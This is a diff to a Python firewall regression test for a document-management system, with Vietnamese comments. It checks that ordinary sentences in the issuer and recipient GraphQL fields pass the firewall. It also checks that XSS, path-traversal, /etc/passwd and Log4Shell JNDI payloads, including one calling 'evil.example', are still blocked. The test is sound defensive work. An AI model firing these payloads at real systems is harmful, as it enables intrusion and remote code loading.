@@ -420,6 +420,42 @@ def check_waf(clerk: Session, director: Session, staff: Session, tag: str) -> No
             status, _, _ = waf_call("GET", "/api/search?" + urllib.parse.urlencode({"q": text}), None, clerk.auth)
             status != 403 or fail(f"WAF chặn nhầm ô Tìm kiếm ({label}): HTTP 403")
     ok(f"chữ thật từng bị chặn nhầm qua WAF ở nội dung dự thảo và ô Tìm kiếm: {', '.join(samples)}")
+    # #260 (loại trừ 15, 16): câu tự viết từng bị 931100, 931120 chặn ở Cơ quan ban hành (receiveIncoming $d, kiểm
+    # trùng $i) và Nơi nhận (soạn $o, sửa $set; dòng đầu, dòng thứ 50) — lượt dò "sau sửa 5" của README
+
+    def via(key: str, text: str) -> int:
+        """text ở khóa biến json.variables.<key> (số là vị trí trong mảng); không token: qua WAF thì cổng trả 401."""
+        def nest(parts: list[str]) -> object:
+            if not parts:
+                return text
+            if parts[0].isdigit():
+                return ["Như trên;"] * int(parts[0]) + [nest(parts[1:])]
+            return {parts[0]: nest(parts[1:])}
+        body = json.dumps({"query": "query { __typename }", "variables": nest(key.split("."))}).encode()
+        return waf_call("POST", "/v1/graphql", body, {"Content-Type": "application/json"})[0]
+
+    written = ["http://192.168.1.10:8080/van-ban/12", "https://10.0.0.5/tai-lieu/bien-ban.pdf",
+               "File kế hoạch thi học kỳ I đã gửi chưa?", "File đính kèm ở đâu?", "file scan bản gốc có không?",
+               "HTTPS là gì?", "Ftp của phòng còn dùng được không?",
+               "https://signet.htechcs.com/van-ban/12 đã ký chưa?", "Http://10.0.0.5/van-ban/12 đã duyệt chưa?",
+               "Ftp://10.0.0.5/van-ban/12",
+               "File này cần trình ký trước ngày 30/10, đồng chí xem giúp?"]
+    shorts = ["d.issuer_name", "i", "o.recipients.0", "o.recipients.49", "set.recipients.0", "set.recipients.49"]
+    blocked = [f"{key}: {text}" for key in shorts for text in written if via(key, text) == 403]
+    not blocked or fail(f"WAF chặn nhầm Cơ quan ban hành, Nơi nhận (#260): {blocked[:3]}")
+    ok(f"Cơ quan ban hành, Nơi nhận qua WAF với {len(written)} câu từng bị 931100, 931120 chặn (#260)")
+    # Tải tấn công trên chính các khóa đó và khóa gần giống — kể cả dòng thứ 51 của Nơi nhận — vẫn 403; câu URL ở
+    # khóa gần giống cũng vẫn 403 (loại trừ không lan ra khóa khác)
+    near = ["d.issuer", "x.issuer_name", "d.issuer_name.x", "i2", "o.recipient.0", "o.recipients.0.x",
+            "set.recipients.50"]
+    tries = [(key, text) for key in shorts + near
+             for text in (sqli, "<script>alert(1)</script>", "../../../etc/passwd", "/etc/passwd",
+                          "${jndi:ldap://evil.example/a}")]
+    tries += [(key, text) for key in near for text in (written[0], "HTTPS là gì?")]
+    passed = [f"{key}: {text}" for key, text in tries if via(key, text) != 403]
+    not passed or fail(f"WAF để lọt qua Cơ quan ban hành, Nơi nhận hay khóa gần giống (#260): {passed[:3]}")
+    ok(f"SQLi, XSS, duyệt thư mục, /etc/passwd, Log4Shell ở Cơ quan ban hành, Nơi nhận và {len(near)} khóa gần giống "
+       "vẫn 403; câu URL ở khóa gần giống vẫn 403")
 
 
 def main(argv: list[str] | None = None) -> None:
